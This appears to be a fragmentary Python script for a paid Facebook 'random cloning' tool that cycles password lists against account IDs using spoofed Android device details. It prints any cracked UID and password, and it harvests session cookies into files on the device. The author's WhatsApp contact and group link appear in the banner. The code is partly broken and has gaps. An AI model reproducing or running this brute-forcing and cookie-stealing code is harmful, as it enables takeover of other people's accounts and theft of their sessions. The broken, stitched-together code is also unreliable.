...
from bs4 import BeautifulSoup as sop	
print('[•] Join My WAHATSAPP Group')
os.system('xdg-open https://chat.whatsapp.com/ILDaTHiFRZi52RtBRK65et/')

try:
	prox= requests.get('https://github.com/Mrabozada/Abo0/blob/main/approval.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\x1b[1;95m[√] GOOD CHANCE...')
...
android_models=[]
try:
	xx = requests.get('https://github.com/Mrabozada/Abo0/blob/main/approval.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	jf=requests.get('https://github.com/Mrabozada/Abo0/blob/main/approval.txt').text.splitlines()
	for us in jf:
		usr.append(us)
except: pass
...
=================================================================
\033[1;95m●▬▬▬▬▬▬▬▬▬▬▬▬๑۩✺࿇✺۩๑▬▬▬▬▬▬▬▬▬▬▬●
\x1b[1;93m║ \x1b[1;92m  𓆦 𝘼𝙐𝙏𝙃𝙊𝙍     : 𝙈𝙍 𝘼𝘽𝙊𝙕𝘼𝘿𝘼
\x1b[1;93m║ \x1b[1;92m  𓆦 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆   : 𝘼𝘽𝙊𝙕𝘼𝘿𝘼
\x1b[1;93m║ \x1b[1;92m  𓆦 𝙒𝘼𝙃𝘼𝙏𝙎𝘼𝙋𝙋  : 𝟎𝟕𝟔𝟒𝟐𝟎𝟑𝟖𝟒𝟑
\x1b[1;93m║ \x1b[1;92m  𓆦 𝙂𝙄𝙏𝙃𝙐𝘽     : 𝙈𝙍 𝘼𝘽𝙊𝙕𝘼𝘿𝘼 𝙏𝙀𝙍𝙈𝙐𝙓
\x1b[1;93m║ \x1b[1;92m  𓆦 𝙎𝙏𝘼𝙏𝙐𝙎     : 𝙍𝘼𝙉𝘿𝙊𝙈 𝘾𝙇𝙊𝙉𝙄𝙉𝙂
\x1b[1;93m║ \x1b[1;92m  𓆦 𝙔𝙊𝙐𝙏𝙐𝘽𝙀    : 𝙈𝙍 𝘼𝘽𝙊𝙕𝘼𝘿𝘼 𝙏𝙀𝙍𝙈𝙐𝙓
\x1b[1;93m║ \x1b[1;92m  𓆦 𝘽𝙀𝙎𝙏𝙁𝙍𝙄𝙀𝙉𝘿 : 𝙎𝘼𝙄𝘿 𝙈𝙐𝙃𝘼𝙈𝘼𝘿
\x1b[1;93m║ \x1b[1;92m  𓆦 𝙑𝙀𝙍𝙎𝙄𝙊𝙉    : 𝟏.𝟑
\x1b[1;93m║ \x1b[1;92m  𓆦 𝙏𝙔𝙋𝙀       : 𝙋𝘼𝙄𝘿
\033[1;95m●▬▬▬▬▬▬▬▬▬▬▬▬๑۩✺࿇✺۩๑▬▬▬▬▬▬▬▬▬▬▬●
\033[1;32m--------------------------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------')
...
def RMABO():
		...
		#	linex()
			...
			if jf in ['1','01']:
			 ...
			 os.system('https://chat.whatsapp.com/ILDaTHiFRZi52RtBRK65et')
			elif jf in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
ABO1 = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat']
ABO = random.choice(ABO1)
def fking1(ids,passlist):
        global loop7
        global oks
        sys.stdout.write('\r\r\033[37;41m [MR ABOZADA]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        fblc = device['fblc']
                        fbcr = sim_id
                        Fjj=random.choice(ABOZADA)
                        Fjjj=random.choice(ABOZADA)
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ABO<>OK]\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/ABOZADA-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/ABOZADA-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;31m [ABO<>CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        open('/sdcard/AN-WOLF-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
